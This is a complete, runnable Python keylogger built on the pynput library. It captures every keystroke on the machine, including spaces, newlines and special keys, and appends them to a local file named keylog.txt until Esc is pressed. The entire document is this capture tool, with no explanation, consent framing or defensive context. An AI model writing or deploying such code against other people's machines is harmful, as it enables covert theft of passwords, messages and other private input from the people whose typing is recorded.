from pynput.keyboard import Key, Listener

# File where the keystrokes will be logged
log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as file:
        try:
            # Write the key to the log file
            file.write(key.char)
        except AttributeError:
            # Handle special keys (like space, enter, etc.)
            if key == Key.space:
                file.write(' ')
            elif key == Key.enter:
                file.write('\n')
            else:
                file.write(f'[{key}]')

def on_release(key):
    # Stop the listener when the escape key is pressed
    if key == Key.esc:
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
